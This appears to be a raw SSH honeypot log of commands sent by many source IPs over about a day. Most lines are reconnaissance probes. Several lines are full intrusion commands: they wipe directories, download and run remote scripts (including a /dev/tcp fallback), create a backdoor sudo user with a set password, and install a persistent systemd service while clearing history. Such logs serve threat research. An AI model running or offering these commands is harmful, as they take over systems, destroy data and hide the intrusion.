start
2024-11-30 11:34:58.672289 - ('203.150.180.7', 35634) - ifconfig
2024-11-30 11:34:59.932294 - ('203.150.180.7', 35634) - uname -a
2024-11-30 11:35:01.192623 - ('203.150.180.7', 35634) - cat /proc/cpuinfo
2024-11-30 11:35:02.452105 - ('203.150.180.7', 35634) - ps | grep '[Mm]iner'
2024-11-30 11:35:03.712021 - ('203.150.180.7', 35634) - ps -ef | grep '[Mm]iner'
2024-11-30 11:35:04.972102 - ('203.150.180.7', 35634) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-30 11:35:06.231625 - ('203.150.180.7', 35634) - echo Hi | cat -n
2024-11-30 12:01:19.356111 - ('92.255.57.132', 58538) - echo 'SSH check'
2024-11-30 13:57:03.305822 - ('92.255.57.132', 59096) - echo 'SSH check'
2024-11-30 14:54:59.473681 - ('92.255.57.132', 48230) - echo 'SSH check'
2024-11-30 15:52:59.042903 - ('92.255.57.132', 52592) - echo 'SSH check'
2024-11-30 16:51:11.312808 - ('92.255.57.132', 35954) - echo 'SSH check'
2024-11-30 17:48:52.131579 - ('92.255.57.132', 43814) - echo 'SSH check'
2024-11-30 18:06:04.473947 - ('37.44.238.68', 53574) - whoami
2024-11-30 18:06:06.577804 - ('37.44.238.68', 53632) - whoami
2024-11-30 18:06:08.932412 - ('37.44.238.68', 53642) - whoami
2024-11-30 18:06:10.615959 - ('37.44.238.68', 53566) - whoami
2024-11-30 18:06:14.072692 - ('37.44.238.68', 53604) - whoami
2024-11-30 18:06:16.151328 - ('37.44.238.68', 53616) - whoami
2024-11-30 18:06:17.836847 - ('37.44.238.68', 53590) - whoami
2024-11-30 18:06:19.852317 - ('37.44.238.68', 53558) - whoami
2024-11-30 18:06:21.990005 - ('37.44.238.68', 53654) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:24.099492 - ('37.44.238.68', 43472) - whoami
2024-11-30 18:06:26.007637 - ('37.44.238.68', 43486) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:27.939541 - ('37.44.238.68', 43492) - whoami
2024-11-30 18:06:29.833396 - ('37.44.238.68', 43500) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:33.010090 - ('37.44.238.68', 43506) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:33.943767 - ('37.44.238.68', 43514) - whoami
2024-11-30 18:06:36.621738 - ('37.44.238.68', 43526) - whoami
2024-11-30 18:06:38.156736 - ('37.44.238.68', 43542) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:40.756812 - ('37.44.238.68', 43552) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:42.968717 - ('37.44.238.68', 55002) - whoami
2024-11-30 18:06:44.783099 - ('37.44.238.68', 55014) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:46.425207 - ('37.44.238.68', 55046) - whoami
2024-11-30 18:06:50.323786 - ('37.44.238.68', 55058) - whoami
2024-11-30 18:06:52.683211 - ('37.44.238.68', 55060) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:53.733067 - ('37.44.238.68', 55074) - whoami
2024-11-30 18:06:55.156540 - ('37.44.238.68', 55086) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:06:56.610595 - ('37.44.238.68', 48032) - whoami
2024-11-30 18:06:58.816363 - ('37.44.238.68', 48046) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:01.438618 - ('37.44.238.68', 48050) - whoami
2024-11-30 18:07:04.612613 - ('37.44.238.68', 48066) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:06.344308 - ('37.44.238.68', 48070) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:08.273863 - ('37.44.238.68', 48084) - whoami
2024-11-30 18:07:09.879324 - ('37.44.238.68', 51128) - whoami
2024-11-30 18:07:11.538470 - ('37.44.238.68', 51132) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:14.088533 - ('37.44.238.68', 51144) - whoami
2024-11-30 18:07:16.300366 - ('37.44.238.68', 41126) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:19.178205 - ('37.44.238.68', 41140) - whoami
2024-11-30 18:07:20.928397 - ('37.44.238.68', 41156) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:23.016855 - ('37.44.238.68', 41168) - whoami
2024-11-30 18:07:24.552958 - ('37.44.238.68', 41172) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:26.226128 - ('37.44.238.68', 41176) - whoami
2024-11-30 18:07:28.823369 - ('37.44.238.68', 53120) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:31.033807 - ('37.44.238.68', 53136) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:33.083058 - ('37.44.238.68', 57466) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:34.582170 - ('37.44.238.68', 57472) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:36.646348 - ('37.44.238.68', 57480) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:39.210535 - ('37.44.238.68', 52742) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:40.498946 - ('37.44.238.68', 52746) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:07:43.362834 - ('37.44.238.68', 46936) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 18:46:23.971144 - ('92.255.57.132', 51798) - echo 'SSH check'
2024-11-30 19:38:00.621061 - ('46.19.143.66', 38710) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 YMp7BHW2) system && sudo usermod -aG sudo system
2024-11-30 19:38:01.108323 - ('46.19.143.66', 38710) - lscpu && echo -e "YMp7BHW2\nYMp7BHW2" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 19:42:57.475234 - ('92.255.57.132', 46050) - echo 'SSH check'
2024-11-30 19:50:45.283662 - ('87.120.113.231', 47672) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 20:39:35.590517 - ('92.255.57.132', 59532) - echo 'SSH check'
2024-11-30 21:36:05.419834 - ('92.255.57.132', 38182) - echo 'SSH check'
2024-11-30 22:33:08.641513 - ('92.255.57.132', 49588) - echo 'SSH check'
2024-11-30 23:29:41.370452 - ('92.255.57.132', 41478) - echo 'SSH check'
2024-12-01 00:26:32.040956 - ('92.255.57.132', 51582) - echo 'SSH check'
2024-12-01 00:46:19.349172 - ('172.248.165.207', 37666) - /ip cloud print
2024-12-01 00:46:19.741971 - ('172.248.165.207', 37666) - ifconfig
2024-12-01 00:46:20.059272 - ('172.248.165.207', 37666) - uname -a
2024-12-01 00:46:20.373490 - ('172.248.165.207', 37666) - cat /proc/cpuinfo
2024-12-01 00:46:20.723939 - ('172.248.165.207', 37666) - ps | grep '[Mm]iner'
2024-12-01 00:46:21.077449 - ('172.248.165.207', 37666) - ps -ef | grep '[Mm]iner'
2024-12-01 00:46:21.413492 - ('172.248.165.207', 37666) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-01 00:46:21.743280 - ('172.248.165.207', 37666) - echo Hi | cat -n
2024-12-01 01:23:13.844308 - ('92.255.57.132', 51840) - echo 'SSH check'
2024-12-01 01:24:48.603144 - ('87.120.113.231', 60130) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 02:20:01.862226 - ('92.255.57.132', 37688) - echo 'SSH check'
2024-12-01 03:09:41.040061 - ('14.39.132.209', 45712) - /ip cloud print
2024-12-01 03:09:42.401473 - ('14.39.132.209', 45712) - ifconfig
2024-12-01 03:09:43.500754 - ('14.39.132.209', 45712) - uname -a
2024-12-01 03:09:44.600909 - ('14.39.132.209', 45712) - cat /proc/cpuinfo
2024-12-01 03:09:45.701224 - ('14.39.132.209', 45712) - ps | grep '[Mm]iner'
2024-12-01 03:09:46.800635 - ('14.39.132.209', 45712) - ps -ef | grep '[Mm]iner'
2024-12-01 03:09:47.910855 - ('14.39.132.209', 45712) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-01 03:09:49.037664 - ('14.39.132.209', 45712) - echo Hi | cat -n
2024-12-01 03:16:48.782932 - ('92.255.57.132', 36886) - echo 'SSH check'
2024-12-01 04:04:11.967555 - ('109.100.33.178', 45738) - scp -t /tmp/WBKSxMD4
2024-12-01 04:04:12.695495 - ('109.100.33.178', 45744) - scp -t /tmp/WBKSxMD4
2024-12-01 04:14:06.944159 - ('92.255.57.132', 40234) - echo 'SSH check'
2024-12-01 04:24:36.915077 - ('87.120.113.231', 59330) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 05:10:51.626431 - ('92.255.57.132', 35106) - echo 'SSH check'
2024-12-01 05:49:17.577447 - ('195.178.110.34', 37050) - apt
2024-12-01 05:49:21.883864 - ('195.178.110.34', 37050) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:49:46.277634 - ('195.178.110.34', 53334) - apt
2024-12-01 05:49:54.980733 - ('195.178.110.34', 53334) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:50:23.583158 - ('195.178.110.34', 41620) - apt
2024-12-01 05:50:32.484627 - ('195.178.110.34', 41620) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:51:00.587202 - ('195.178.110.34', 46086) - apt
2024-12-01 05:51:06.578962 - ('195.178.110.34', 46086) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:52:20.383663 - ('195.178.110.34', 53256) - apt
2024-12-01 05:52:25.579319 - ('195.178.110.34', 53256) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:52:58.992138 - ('195.178.110.34', 38578) - apt
2024-12-01 05:53:04.383959 - ('195.178.110.34', 38578) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 05:53:36.290301 - ('195.178.110.34', 33784) - apt
2024-12-01 05:53:41.481031 - ('195.178.110.34', 33784) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
